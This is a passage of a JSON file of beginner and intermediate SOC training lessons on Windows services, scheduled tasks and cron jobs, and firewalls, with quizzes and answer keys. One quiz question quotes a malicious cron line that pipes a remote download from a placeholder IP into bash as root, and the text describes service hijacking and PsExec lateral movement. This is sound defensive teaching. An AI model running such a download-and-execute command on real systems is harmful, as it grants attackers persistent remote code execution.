+  "topic": "Windows Fundamentals",
+  "difficulty": "beginner",
+  "kind": "lesson",
+  "intro": "Much of what Windows does happens without any window on screen: updating itself, listening for network connections, running antivirus, printing. These background workers are Windows services, and they start before anyone even logs in. For a SOC analyst, services are a double-sided topic — they are essential system machinery, and they are one of the most reliable ways attackers gain privileged, boot-surviving persistence. This lesson explains what a service is, how Windows manages and runs them, why svchost.exe hosts so many, and how attackers abuse services — with the telemetry that reveals it.",
+  "sections": [
+    {
+      "heading": "What a Windows Service Is",
+      "content": "A **Windows service** is a program that runs in the background, without a user interface, typically starting automatically when the computer boots and running whether or not anyone is logged in. Services are the invisible workforce of Windows: Windows Update, the print spooler, the firewall, antivirus engines, and countless others are services quietly doing their jobs.\n\nThe contrast with an ordinary application makes the idea concrete. When you open a web browser, *you* launch it, it shows a window, and it runs as *your* user account; when you log off, it closes. A service is the opposite in every respect: it starts on its own (often at boot), has no window, and runs under a **service account** independent of any logged-in user. That is precisely what you want for machinery that must run continuously — a mail server or antivirus cannot depend on someone being logged in.\n\nThe security-critical feature is **which account a service runs as**. Services frequently run under powerful built-in accounts:\n\n- **LocalSystem** — an extremely privileged account with near-total control of the machine. Many core services run as LocalSystem.\n- **LocalService** and **NetworkService** — lower-privileged built-in accounts for services that need less.\n- **A custom service account** — a dedicated account created for a specific service.\n\nBecause a service can run at boot, with high privilege, and without a user present, it is an almost ideal vehicle for an attacker: install a malicious service and your code runs automatically, early, and powerfully, every time the machine starts. That is the theme of this lesson — services are essential, and their very strengths (autostart, privilege, invisibility) are exactly what make them attractive to abuse. To see how that abuse works, you first need to know how Windows manages services, the next section."
+    },
+    {
+      "heading": "How Windows Manages and Runs Services",
+      "content": "Windows coordinates all services through a central component and exposes several ways to view and control them.\n\n**The Service Control Manager (SCM).** The **SCM** is the part of Windows responsible for starting, stopping, and tracking services. At boot it reads which services should start and launches them; while the system runs, it monitors their state and can restart them if they fail. Every service is registered with the SCM, and its configuration lives in the Registry under `HKLM\\System\\CurrentControlSet\\Services` (connecting to the Registry lesson).\n\n**Start types.** Each service has a **start type** that controls when it runs:\n\n- **Automatic** — starts at boot.\n- **Automatic (Delayed Start)** — starts shortly after boot, to reduce startup load.\n- **Manual** — starts only when something requests it.\n- **Disabled** — will not start at all.\n\nAn attacker planting persistence typically wants **Automatic**, so their code runs on every boot.\n\n**svchost.exe — the shared host.** Many Windows services are not standalone `.exe` files; they are DLLs run inside a shared host process called **`svchost.exe`** (Service Host). To save resources, Windows groups multiple services into `svchost.exe` instances, so you will see *many* `svchost.exe` processes running, each hosting one or more services. This is normal — but it is also why attackers love to imitate it. A legitimate `svchost.exe` is always launched by **`services.exe`** (the SCM's process) and lives in `System32`; malware masquerading as `svchost.exe` from the wrong folder or under the wrong parent is a classic tell (recall the process-tree lesson).\n\n**Tools to view and control services.** Analysts and admins use the **Services console** (`services.msc`) for a graphical list, and the command-line **`sc.exe`** to query and configure services (`sc query`, `sc create`, `sc config`). Attackers use these same tools — a service being created with `sc create` is something worth watching.\n\nWith this model in mind — SCM launching Automatic services at boot, many hidden inside svchost, all configured in the Registry — you can see exactly where an attacker inserts themselves, which the next section makes explicit."
+    },
+    {
+      "heading": "How Attackers Abuse Services",
+      "content": "Services give attackers three things they prize: **automatic startup**, **high privilege**, and **legitimate-looking cover**. Several techniques exploit this, all catalogued by MITRE ATT&CK under **Create or Modify System Process: Windows Service** and related entries.\n\n**Creating a malicious service (persistence + privilege).** The attacker registers a new service that points at their malware and sets it to start automatically. Now their code runs at every boot, typically as **LocalSystem** — early, automatic, and highly privileged. This is one of the most durable persistence mechanisms available, because it survives reboots and logoffs and runs before most user activity.\n\n**Hijacking an existing service.** Rather than create a new service (which is noisier), an attacker may modify an existing one — changing the binary path it points to so the legitimate service now launches the attacker's code, or replacing the service's executable on disk. The service name looks normal; the code behind it is not.\n\n**Service-based remote execution — PsExec.** A hugely common technique for **lateral movement** relies on services. Tools like **PsExec** work by connecting to a remote machine, copying a program to it, and **creating a service** to run that program remotely. This is why unexpected service creation on a machine — especially one you did not administer — is a hallmark of an attacker spreading through the network. The famous **service-creation event** (below) lights up when this happens.\n\n**Service account abuse.** Because services often run as powerful accounts, compromising or abusing a service is a path to privilege. And custom **service accounts** — with strong permissions and passwords that rarely change — are targets in their own right (the weakness behind Kerberoasting, covered elsewhere).\n\nWhat ties these together is that a service is a *trusted, privileged, automatic* execution slot. An attacker who controls one has a foothold that is hard to dislodge and easy to overlook, because \"a service\" sounds inherently legitimate. That is exactly why the SOC watches service activity closely, which the final section details."
+    },
+    {
+      "heading": "Detecting Malicious Service Activity",
+      "content": "Service abuse is loud if you are listening on the right channel, because installing or changing a service generates specific, well-known events.\n\n**The headline event: 7045.** Windows Security/System logging records **Event ID 7045** when **a new service is installed**, capturing the service name and the binary it will run. This is one of the highest-value events in Windows monitoring. A new service whose binary sits in a user's Temp or Downloads folder, has a random-looking name, or appears on a machine during suspected lateral movement (the PsExec pattern) is a strong indicator of compromise. Many real intrusions are caught precisely at the 7045 event.\n\n**Supporting events:**\n\n- **Event ID 7034 / 7036** — a service crashed or changed state (started/stopped). A security service unexpectedly stopping can indicate tampering.\n- **Event ID 4697** — service installation recorded via Security auditing (a complementary source to 7045).\n- **Registry telemetry** — changes under `HKLM\\System\\CurrentControlSet\\Services` (Sysmon registry events) reveal services being created or reconfigured, including binary-path changes that signal hijacking.\n- **Process and command-line logs** — `sc create`, `sc config`, or PsExec-style activity, tied back to the responsible process and its parent.\n\n**How to hunt.** Treat service *creation and modification* as inherently interesting and validate each against what is normal:\n\n- **New services (7045)** pointing at suspicious paths, with odd names, or created around other signs of intrusion.\n- **Changes to an existing service's binary path**, the fingerprint of hijacking.\n- **`svchost.exe` anomalies** — a process named svchost running from the wrong folder or launched by something other than `services.exe`.\n- **Security services stopping** unexpectedly.\n\nThe defensive principle is that **legitimate new services are relatively rare and usually tied to software installs**, so a service appearing outside that context deserves scrutiny. Combine the service event with the surrounding story — the process that created it, the file it points to, and whether this machine was already showing signs of attacker activity — and a single 7045 becomes the moment you catch persistence or lateral movement in the act."
+    }
+  ],
+  "keyTakeaways": [
+    "A Windows service is a background program with no UI that usually starts at boot and runs under a service account (often the highly privileged LocalSystem) independent of any logged-in user — ideal machinery, and an ideal attacker persistence vehicle.",
+    "The Service Control Manager (SCM) starts and tracks services (configured in the Registry under ...CurrentControlSet\\Services); start types range from Automatic (attacker's preference) to Disabled, and many services run as DLLs inside shared svchost.exe processes launched by services.exe.",
+    "Attackers create malicious auto-start services (durable, privileged persistence), hijack existing services by changing their binary path, and use service creation for remote execution/lateral movement (PsExec) — svchost imitation from the wrong path/parent is a classic tell.",
+    "Detect with Event ID 7045 (new service installed) as the headline signal — suspicious binary path, odd name, or PsExec-pattern lateral movement — plus 7034/7036 (state change), 4697, service-key registry changes, and sc.exe/PsExec command-line telemetry."
+  ],
+  "quiz": [
+    {
+      "question": "While investigating a possible intrusion you see Windows Event ID 7045 on a server, showing a newly installed service with a random-looking name whose binary is located in C:\\Users\\Public\\temp. Why is this significant?",
+      "options": [
+        {
+          "label": "It is routine, because Windows automatically installs a new randomly-named service in a public temp folder every time any user simply logs on to the server.",
+          "value": "a"
+        },
+        {
+          "label": "Event 7045 records a new service installation, and a random name with a binary in a temp folder matches attacker persistence or PsExec-style lateral movement.",
+          "value": "b"
+        },
+        {
+          "label": "It shows a service was permanently deleted, so the alert simply confirms that cleanup of old software completed successfully and needs no further review.",
+          "value": "c"
+        },
+        {
+          "label": "It indicates the firewall was reconfigured, because service installation events are how Windows records inbound and outbound firewall rule changes.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "Event ID 7045 fires when a new service is installed; a random-looking name with a binary in a user-writable temp folder is a strong indicator of malicious persistence or PsExec-style lateral movement, since legitimate services rarely look like that. Option a is false because Windows does not auto-create random services at logon. Option c is wrong because 7045 records installation, not deletion. Option d misattributes firewall changes to service-install events."
+    },
+    {
+      "question": "You see a process named svchost.exe running from C:\\Users\\Alice\\AppData\\Local, and its parent process is not services.exe. Why is this suspicious?",
+      "options": [
+        {
+          "label": "It is normal, because svchost.exe is designed to run from each user's AppData folder and is routinely launched by whatever application needs it at the time.",
+          "value": "a"
+        },
+        {
+          "label": "Legitimate svchost.exe runs from System32 and is launched by services.exe, so a copy from a user folder with the wrong parent is likely malware impersonating it.",
+          "value": "b"
+        },
+        {
+          "label": "It simply means the user manually started a background service, which is the standard supported way to add new Windows services to a machine.",
+          "value": "c"
+        },
+        {
+          "label": "It confirms the machine is fully patched, because only updated svchost.exe binaries are permitted to run from a user's AppData directory by design.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "A legitimate svchost.exe lives in System32 and is always launched by services.exe (the SCM); a svchost running from a user's AppData folder with a different parent is a classic impersonation of a trusted system process, revealed by its wrong path and lineage. Option a is false because svchost does not run from AppData. Option c misdescribes how services are added. Option d invents a patching guarantee that has nothing to do with the observation."
+    }
+  ],
+  "references": [
+    "https://learn.microsoft.com/en-us/windows/win32/services/services",
+    "https://attack.mitre.org/techniques/T1543/003/",
+    "https://attack.mitre.org/techniques/T1569/002/"
+  ],
+  "xp": 200,
+  "estimatedMinutes": 38,
+  "researchUsed": false,
+  "createdAt": "2026-08-15T00:00:00.000Z"
+},
+{
+  "id": "topic-lesson-scheduled-tasks-and-cron-jobs",
+  "slug": "scheduled-tasks-and-cron-jobs",
+  "title": "Scheduled Tasks and Cron Jobs",
+  "topic": "Operating System Fundamentals",
+  "difficulty": "intermediate",
+  "kind": "lesson",
+  "intro": "Every operating system can be told to run a program automatically — at 3 a.m. every night, at every boot, or every ten minutes. On Windows this is done with Scheduled Tasks; on Linux with cron jobs. These schedulers are essential for legitimate automation like backups and updates, but they are also one of the most common ways attackers make their malware persistent and stealthy. This lesson explains how both schedulers work, why they are perfect for persistence, and how a SOC analyst detects a malicious task or cron entry across Windows and Linux.",
+  "sections": [
+    {
+      "heading": "Why Scheduling Exists",
+      "content": "A **scheduler** is the part of an operating system that runs a chosen program automatically based on a **trigger** — a time, an event, or a recurring interval — without anyone having to launch it by hand. Every real environment depends on scheduling for routine automation: nightly backups, software updates, log rotation, cleanup jobs, and health checks all run on schedules so humans do not have to remember them.\n\nThe idea has two halves that are worth naming, because they apply to both Windows and Linux:\n\n- **A trigger** — *when* the task should run. This might be a specific time (\"2:00 a.m. daily\"), a recurring interval (\"every 15 minutes\"), or a system event (\"at startup,\" \"at user logon\").\n- **An action** — *what* should run. Usually a program, script, or command.\n\nPut simply, a scheduled job says \"**run this** (action) **whenever that happens** (trigger).\"\n\nThis simple, legitimate capability is exactly what makes schedulers so useful to attackers, and the theme runs through the whole lesson. If you can tell the operating system to run *your* program automatically and repeatedly, you have solved two of an intruder's core problems at once:\n\n- **Persistence** — surviving reboots and logoffs. A scheduled task set to run at startup relaunches the malware every time the machine boots, so a reboot no longer removes the attacker.\n- **Stealth and resilience** — a task that runs \"every hour\" quietly re-establishes a connection or re-launches a payload on its own, and it hides among the many legitimate scheduled jobs already on the system.\n\nBecause both Windows and Linux offer this, MITRE ATT&CK groups the abuse under a single technique, **Scheduled Task/Job (T1053)**, with sub-techniques for each platform. The next two sections cover the Windows and Linux mechanisms in turn, and the final section covers detecting abuse on both."
+    },
+    {
+      "heading": "Windows Scheduled Tasks",
+      "content": "On Windows, scheduling is handled by the **Task Scheduler**, and individual jobs are called **scheduled tasks**. Each task pairs one or more **triggers** (when) with one or more **actions** (what to run), and the system executes the action whenever a trigger fires.\n\n**Triggers** on Windows are rich, which is part of why the feature is so abusable. A task can be set to run:\n\n- At a specific **time** or on a recurring schedule (daily, hourly, every N minutes).\n- **At system startup** — a favourite for persistence, since the task runs on every boot.\n- **At user logon** — running when a particular user (or any user) signs in.\n- On a **system event**, such as a specific log entry appearing.\n\n**Managing tasks.** Users and admins create and view tasks with the graphical **Task Scheduler** app, or the command-line **`schtasks.exe`** (and PowerShell's scheduled-task commands). The definitions themselves are stored as XML files under `C:\\Windows\\System32\\Tasks` and referenced in the Registry. So `schtasks /create` on a command line is the CLI way to plant a task — and a common one in attacks.\n\n**Why attackers use scheduled tasks.** They deliver everything an intruder wants: automatic execution, a choice of triggers (boot, logon, or interval), the ability to run under a chosen account (including highly privileged ones), and camouflage among the dozens of legitimate tasks Windows and installed software already register. An attacker might create a task named to look like a Windows or vendor task, set to run their payload at startup or every few minutes, giving them durable persistence and a self-healing foothold. MITRE tracks this as **Scheduled Task/Job: Scheduled Task (T1053.005)**.\n\nA recurring giveaway is the *action*: a legitimate maintenance task usually runs a recognisable program, while a malicious one often runs PowerShell with an encoded command, a script from a temp folder, or a suspicious binary. The action, the trigger, and the task's name together tell you whether a task belongs — which is exactly what the detection section builds on."
+    },
+    {
+      "heading": "Linux Cron Jobs",
+      "content": "On Linux (and Unix-like systems), the classic scheduler is **cron**, and the jobs it runs are **cron jobs**. A background service called the **cron daemon** wakes up every minute, checks whether any job is due, and runs the ones that are.\n\n**Where cron jobs live.** There are several locations, and an analyst should know them because attackers hide in all of them:\n\n- **Per-user crontabs** — each user has their own list of jobs, edited with `crontab -e` and viewed with `crontab -l`.\n- **The system crontab** — `/etc/crontab` and files in `/etc/cron.d/`, which run system-wide jobs (often as root).\n- **The drop-in directories** — `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, and `/etc/cron.monthly/`, which run any script placed inside them on that cadence.\n\n**Cron syntax.** A cron entry begins with five time-and-date fields, then the command:\n\n```\n*  *  *  *  *   command-to-run\n│  │  │  │  │\n│  │  │  │  └─ day of week (0-7)\n│  │  │  └──── month (1-12)\n│  │  └─────── day of month (1-31)\n│  └────────── hour (0-23)\n└───────────── minute (0-59)\n```\n\nSo `0 3 * * *` means \"at 03:00 every day,\" and `*/10 * * * *` means \"every 10 minutes.\" An asterisk means \"every.\" Reading this syntax lets you tell at a glance how often a job runs — and an entry set to run every minute or every few minutes is a common beaconing/persistence pattern.\n\n**Related mechanisms.** Modern Linux also has **systemd timers**, which do a similar job through systemd units, and the **`at`** command for one-off scheduled runs. Attackers use these too, so they are worth knowing alongside classic cron.\n\n**Why attackers use cron.** Exactly as on Windows: a cron entry gives automatic, recurring execution that survives reboots, can run as root, and blends in with the legitimate cron jobs every Linux system already has. MITRE tracks this as **Scheduled Task/Job: Cron (T1053.003)**. A malicious cron job frequently runs a shell command that pulls down and executes a payload (`curl ... | bash`) or re-opens a reverse shell on a tight interval — self-healing persistence in one line."
+    },
+    {
+      "heading": "Detecting Malicious Scheduled Jobs",
+      "content": "Because scheduled tasks and cron jobs are such reliable persistence, detecting their creation and modification is essential SOC work — and both platforms leave traces.\n\n**On Windows:**\n\n- **Event ID 4698** — *a scheduled task was created* — is the headline signal, capturing the task name and its action. A new task running PowerShell with an encoded command, or a binary from a temp folder, is a strong indicator. Related events include **4699** (task deleted), **4700/4701** (enabled/disabled), and **4702** (task updated).\n- **Task Scheduler operational log** entries (such as event **106** for task registration) provide an additional trail.\n- **File and process telemetry** — creation of XML files under `C:\\Windows\\System32\\Tasks`, and command lines showing **`schtasks /create`** or PowerShell scheduling, tied back to the responsible parent process.\n\n**On Linux:**\n\n- **Changes to crontab files and cron directories** — modifications to `/etc/crontab`, `/etc/cron.d/`, the `cron.*` drop-in folders, or user crontabs. File-integrity monitoring on these paths is a core detection.\n- **Process/audit logs** — the Linux **auditd** or EDR telemetry showing a user editing crontabs (`crontab -e`) or the **cron daemon spawning** an unexpected child process (a cron job launching `bash`, `curl`, or a script from `/tmp`).\n- **The job's action** — a cron line that pipes a download into a shell, or runs on a very tight interval, stands out.\n\n**How to hunt, on either platform.** The unifying method is to treat **job creation and modification as inherently interesting**, then judge each by three questions: *When* does it run (startup, logon, or a suspiciously tight interval)? *What* does it run (a recognisable program, or PowerShell-encoded/temp-folder/shell-download activity)? And *who/what created it* (tied to a suspicious process or user)? Legitimate scheduled jobs are usually installed by software and run recognisable programs on sensible schedules, so a job that fails those tests — an odd name, a hidden action, an aggressive interval, created by an unexpected process — is exactly the persistence a SOC is looking for. Correlate the scheduled-job event with the surrounding process tree and file activity, and you catch the attacker planting their foothold on both Windows and Linux."
+    }
+  ],
+  "keyTakeaways": [
+    "Schedulers run a program automatically based on a trigger (time, interval, boot, or logon); Windows uses Scheduled Tasks (Task Scheduler / schtasks.exe) and Linux uses cron jobs (cron daemon) — both essential for automation and both abused for persistence under MITRE T1053.",
+    "Windows tasks pair triggers (startup and logon are attacker favourites) with actions, are managed via Task Scheduler/schtasks and stored as XML under System32\\Tasks; malicious tasks often run PowerShell-encoded commands or temp-folder binaries (T1053.005).",
+    "Linux cron jobs live in user crontabs, /etc/crontab, /etc/cron.d, and cron.hourly/daily/weekly/monthly; the five-field syntax (min hour dom mon dow) reveals cadence, and tight intervals or 'curl | bash' actions signal abuse (T1053.003), alongside systemd timers and at.",
+    "Detect with Windows Event 4698 (task created) plus 4699/4702 and schtasks command lines, and on Linux with file-integrity monitoring of cron paths plus auditd/EDR showing crontab edits or the cron daemon spawning shells — judging each job by when it runs, what it runs, and who created it."
+  ],
+  "quiz": [
+    {
+      "question": "On a Linux server you find a new entry in /etc/cron.d that reads: */5 * * * * root curl -s http://185.x.x.x/p | bash. Why is this a strong indicator of malicious persistence?",
+      "options": [
+        {
+          "label": "It is a normal system backup, because the */5 schedule means it runs only once every five days and root is the standard account for backups.",
+          "value": "a"
+        },
+        {
+          "label": "It runs every 5 minutes as root, downloading and executing a remote script, which gives an attacker self-healing, reboot-surviving persistence.",
+          "value": "b"
+        },
+        {
+          "label": "It disables cron entirely, because piping curl into bash overwrites the cron daemon and prevents any scheduled jobs from ever running again.",
+          "value": "c"
+        },
+        {
+          "label": "It is harmless test output, because cron entries beginning with */5 are comments that Linux ignores and never actually executes as commands.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "The `*/5 * * * *` schedule means every 5 minutes, running as root, and `curl -s ... | bash` downloads and immediately executes a remote script — recurring, privileged, self-healing persistence that survives reboots, a classic cron abuse (T1053.003). Option a misreads */5 as every five days and mislabels it a backup. Option c invents a nonexistent effect. Option d is false because */5 entries are active schedules, not comments."
+    },
+    {
+      "question": "Which Windows event most directly signals that an attacker has created a scheduled task for persistence, and what should you examine about it?",
+      "options": [
+        {
+          "label": "Event ID 4624, examining the logon type, because scheduled-task creation is recorded as an interactive logon by the SYSTEM account.",
+          "value": "a"
+        },
+        {
+          "label": "Event ID 4698, examining the task's action and trigger, because it records a scheduled task being created including what it runs and when.",
+          "value": "b"
+        },
+        {
+          "label": "Event ID 7045, examining the binary path, because scheduled tasks and Windows services are recorded by the identical event on modern systems.",
+          "value": "c"
+        },
+        {
+          "label": "Event ID 4104, examining the script block, because every scheduled task is internally stored and logged as a PowerShell script block on creation.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "Event ID 4698 records the creation of a scheduled task, including its action (what runs) and trigger (when), so examining those reveals whether it is malicious — for example PowerShell-encoded commands or a temp-folder binary set to run at startup. Option a is wrong because 4624 is a logon event, not task creation. Option c confuses scheduled tasks with services (7045). Option d wrongly claims all tasks are stored as PowerShell script blocks."
+    }
+  ],
+  "references": [
+    "https://attack.mitre.org/techniques/T1053/005/",
+    "https://attack.mitre.org/techniques/T1053/003/",
+    "https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page"
+  ],
+  "xp": 210,
+  "estimatedMinutes": 40,
+  "researchUsed": false,
+  "createdAt": "2026-08-15T00:00:00.000Z"
+},
+{
+  "id": "topic-lesson-firewall-fundamentals",
+  "slug": "firewall-fundamentals",
+  "title": "Firewall Fundamentals",
+  "topic": "Network Security",
+  "difficulty": "beginner",
+  "kind": "lesson",
+  "intro": "A firewall is the oldest and most familiar network defence, the gatekeeper that decides which traffic is allowed to pass and which is turned away. Yet many analysts use firewall logs every day without a clear picture of how a firewall actually makes those decisions. This beginner lesson builds that picture from the ground up: what a firewall is, how it evaluates traffic with rules, the difference between stateless and stateful filtering and modern application-aware firewalls, where firewalls sit in a network, and how a SOC analyst reads firewall logs to catch attacks — especially the outbound traffic that betrays a compromise.",
+  "sections": [
+    {
+      "heading": "What a Firewall Is and How It Decides",
+      "content": "A **firewall** is a security device or piece of software that controls network traffic by deciding, for each connection, whether to **allow** it or **block** it based on a set of **rules**. It is the checkpoint between two networks — classically between your trusted internal network and the untrusted internet — inspecting traffic trying to cross and permitting only what the rules approve.\n\nThe real-life analogy is a **security guard at a building entrance with a rulebook**. Everyone approaching is checked against the rules: employees with the right badge pass, unexpected visitors are turned away. The firewall does this for network packets, thousands of times a second.\n\n**How a firewall decides** comes down to matching each connection against its **rulebase** — an ordered list of rules. Each rule typically matches on a handful of properties, often called the **five-tuple**:\n\n- **Source IP** — where the traffic is coming from.\n- **Destination IP** — where it is going.\n- **Source and destination port** — which service is involved (recall ports label services; e.g. 443 is HTTPS, 22 is SSH).\n- **Protocol** — TCP, UDP, and so on.\n\nA rule says, in effect, \"traffic matching *these* properties is allowed (or denied).\" For example: \"allow TCP to destination port 443 from the internal network\" lets users browse the web, while \"deny all inbound to port 3389\" blocks external Remote Desktop.\n\nTwo principles govern how rules are applied, and both matter to an analyst:\n\n- **Rules are evaluated in order**, and usually the *first* matching rule wins. So rule order changes behaviour.\n- **Default deny.** A well-configured firewall ends with an implicit rule that **blocks anything not explicitly allowed**. This \"deny by default\" stance means you decide what *is* permitted and everything else is refused — the opposite of allowing everything and blocking known-bad. Understanding default-deny is key to reading logs: a blocked connection may simply be traffic that matched no allow rule.\n\nWith this model — match the connection's properties against an ordered rulebase, allow or deny, default to deny — you can already interpret the core of any firewall's behaviour. The next section refines it by looking at *how deeply* different firewalls inspect."
+    },
+    {
+      "heading": "Stateless, Stateful, and Next-Generation Firewalls",
+      "content": "Firewalls differ in **how deeply they understand the traffic they filter**, and the three generations are worth knowing because they explain what a given firewall can and cannot catch.\n\n**Packet filtering (stateless).** The earliest firewalls examine each packet **in isolation**, checking its five-tuple against the rules with no memory of what came before. This is fast but limited: because it does not track the state of a connection, it cannot easily tell a legitimate reply apart from an unsolicited packet crafted to look like one. A stateless firewall is like a guard who checks each person's badge but remembers nothing about who is already inside.\n\n**Stateful inspection.** The major improvement, and the norm for decades, is the **stateful firewall**, which **tracks the state of each connection**. When it allows an outbound request, it remembers that connection and automatically permits the matching reply, while still blocking unsolicited inbound traffic. This connection awareness is why you generally write rules for the *initiating* direction and trust the firewall to handle the return traffic. A stateful firewall is a guard who remembers who they let in, so returning visitors are recognised and unexpected ones are still stopped.\n\n**Next-Generation Firewalls (NGFW).** Modern firewalls go further, adding **application-awareness and deeper inspection**. An NGFW can identify the *application* inside the traffic (not just the port), inspect content, integrate threat intelligence, and often decrypt and examine encrypted traffic. This matters because attackers hide inside allowed ports — malware talking out over port 443 looks like normal web traffic to a simple firewall, but an NGFW can often tell it apart by behaviour and content.\n\n**Host vs network firewalls.** Firewalls also differ by *where* they run. A **network firewall** guards the boundary between whole networks (protecting the organisation at its edge). A **host-based firewall** runs on an individual machine, controlling that one computer's traffic — for example the **Windows Defender Firewall**, or **iptables/nftables** on Linux. Both matter to an analyst: the network firewall shows traffic crossing the perimeter, while host firewalls can contain a compromised machine or reveal local connection attempts.\n\nKnowing which kind of firewall produced a log tells you how much to trust it: a stateless device sees less than a stateful one, and an NGFW may give you application-level detail a basic filter never could."
+    },
+    {
+      "heading": "Ingress, Egress, and Why Outbound Matters",
+      "content": "Firewalls filter traffic in two directions, and a common beginner mistake is to focus only on one. Both directions carry security signal, and for a SOC the *less obvious* one is often the more valuable.\n\n**Ingress (inbound) filtering** controls traffic coming *into* the network from outside. This is the intuitive job of a firewall: keep attackers out. Ingress rules block unsolicited connections to internal services, so the internet cannot directly reach your servers' management ports, databases, or file shares. A firewall exposing something like Remote Desktop (port 3389) or a database port to the whole internet is the classic dangerous misconfiguration, because it invites direct attack.\n\n**Egress (outbound) filtering** controls traffic leaving the network. This is frequently neglected — many organisations allow almost all outbound traffic — but it is enormously important for detection, for one central reason: **after an attacker is already inside, their activity shows up as outbound traffic.**\n\nConsider what an intruder must do once they have a foothold:\n\n- **Command and control (C2)** — their malware reaches *out* to the attacker's server for instructions.\n- **Data exfiltration** — stolen data flows *out* of the network to somewhere the attacker controls.\n- **Downloading tools** — additional payloads are pulled *in*, initiated by an outbound request.\n\nEvery one of these crosses the firewall **outbound**. This is why **egress filtering** — restricting and closely watching what may leave — is such a powerful control. If internal machines are only allowed to reach approved destinations and ports, an attacker's C2 connection to an unknown server is blocked or, at minimum, logged as an anomaly. A blocked or unusual *outbound* connection is often the first sign that a machine inside your walls is compromised.\n\nThe takeaway for an analyst is to give outbound firewall activity as much attention as inbound. Inbound denials tell you who is knocking; **outbound denials and anomalies often tell you who is already inside and trying to phone home.** That reframing — the firewall as a detector of insiders reaching out, not just a wall against outsiders reaching in — is what makes firewall logs a live investigation tool rather than a passive barrier."
+    },
+    {
+      "heading": "Reading Firewall Logs as an Analyst",
+      "content": "Firewalls generate logs of the decisions they make, and those logs are among the most-used data sources in a SOC. Learning to read them turns the firewall from a silent barrier into a rich source of evidence.\n\n**What a firewall log entry contains.** A typical entry records the essentials of one connection decision:\n\n- The **action** — allowed or denied (blocked).\n- The **source and destination IP**, and the **ports** and **protocol** — the five-tuple.\n- A **timestamp**, and often the **rule** that matched, the **direction**, and bytes transferred.\n\nReading an entry is a matter of assembling these into a sentence: *\"at this time, traffic from this source to this destination on this port was allowed or denied by this rule.\"*\n\n**What analysts hunt for in firewall logs:**\n\n- **Denied inbound bursts** — many blocked connection attempts to a range of ports from one external source is **port scanning**, an attacker mapping what is exposed.\n- **Outbound connections to suspicious destinations** — an internal machine reaching out to a known-bad IP, a newly-registered domain, or an unusual country/port is a strong **C2 or exfiltration** signal. This is where egress visibility pays off.\n- **Large outbound data transfers** — an internal host sending an unusually large volume out can indicate **data exfiltration**.\n- **Traffic that should never happen** — a workstation connecting directly to the internet on an odd port, or one internal machine scanning many others (possible lateral movement).\n- **Allowed traffic to risky services** — connections reaching management ports that should be restricted.\n\n**How to use them.** Firewall logs are best as **one source among several**. On their own they show *that* a connection happened; combined with endpoint telemetry (which process made it) and threat intelligence (is that destination known-bad), they become conclusive. A classic pivot: a firewall log shows a workstation beaconing to an external IP every few minutes; you pivot to the endpoint's process tree to find *which* process is doing it, and to threat intel to confirm the destination — turning a firewall line into a full C2 detection.\n\nThe mindset is that the firewall is both a **control** (it blocks) and a **sensor** (it records). Even traffic it *allows* is logged, so firewall data helps you reconstruct what happened even when nothing was blocked. Used well — with special attention to outbound activity — firewall logs are often where the first thread of a real intrusion is pulled."
+    }
+  ],
+  "keyTakeaways": [
+    "A firewall allows or blocks each connection by matching its five-tuple (source/destination IP, source/destination port, protocol) against an ordered rulebase, where the first match usually wins and a well-configured firewall ends in default-deny (block anything not explicitly allowed).",
+    "Firewalls vary in inspection depth: stateless packet filters check each packet alone, stateful firewalls track connections (allowing replies to permitted outbound requests), and NGFWs add application-awareness and content/threat inspection; they also run at the network edge or as host-based firewalls (Windows Defender Firewall, iptables).",
+    "Both directions matter, but egress (outbound) filtering is the under-used, high-value control: an attacker who is already inside reveals themselves through outbound C2, data exfiltration, and tool downloads, so a blocked or unusual outbound connection is often the first sign of compromise.",
+    "Firewall logs record the action (allow/deny), five-tuple, time, and matched rule; analysts hunt denied inbound bursts (port scanning), outbound connections to suspicious destinations (C2/exfil), large outbound transfers, and traffic that should never happen — then pivot to endpoint and threat-intel to confirm."
+  ],
+  "quiz": [
+    {
+      "question": "Why is egress (outbound) firewall filtering considered such a valuable detection control, even though a firewall's most intuitive job is blocking inbound attacks?",
+      "options": [
+        {
+          "label": "Because outbound filtering encrypts all leaving traffic, which is the only way to prevent an external attacker from ever scanning the network's open ports.",
+          "value": "a"
+        },
+        {
+          "label": "Because once an attacker is already inside, their command-and-control, data exfiltration, and tool downloads all cross the firewall outbound, so egress control catches them.",
+          "value": "b"
+        },
+        {
+          "label": "Because outbound rules are the only rules a firewall logs, so inbound traffic decisions are never recorded and cannot be reviewed by an analyst afterward.",
+          "value": "c"
+        },
+        {
+          "label": "Because egress filtering automatically assigns IP addresses to internal hosts, replacing DHCP and ensuring every machine can reach the internet safely.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "Egress filtering is powerful because an attacker who already has a foothold must reach outward — for C2 instructions, to exfiltrate data, and to download tools — so controlling and watching outbound traffic catches activity that inbound-only defence misses, and a blocked/unusual outbound connection is often the first sign of compromise. Option a wrongly claims egress encrypts traffic. Option c is false because firewalls log inbound decisions too. Option d confuses firewalls with DHCP."
+    },
+    {
+      "question": "In firewall logs you see a single external IP generating hundreds of denied inbound connection attempts across many different ports within a minute. What does this pattern most likely represent?",
+      "options": [
+        {
+          "label": "A stateful inspection failure, because a correctly configured firewall would have allowed all of these connections rather than denying any of them.",
+          "value": "a"
+        },
+        {
+          "label": "Port scanning, an attacker probing many ports to map which services are exposed, revealed here by the burst of denied attempts across different ports.",
+          "value": "b"
+        },
+        {
+          "label": "Normal web browsing, because loading a single modern website legitimately opens hundreds of simultaneous inbound connections from the server to the user.",
+          "value": "c"
+        },
+        {
+          "label": "Data exfiltration, because stolen data always leaves the network as a rapid series of denied inbound connections from an external address.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "Many denied inbound attempts to a range of ports from one external source is the classic signature of port scanning — an attacker mapping which services are exposed — and the denials show the firewall refusing the probes. Option a misreads normal deny behaviour as a failure. Option c is wrong because web browsing is outbound-initiated by the user, not hundreds of inbound connections. Option d describes exfiltration, which is outbound, not denied inbound traffic."
+    }
+  ],
+  "references": [
+    "https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/",
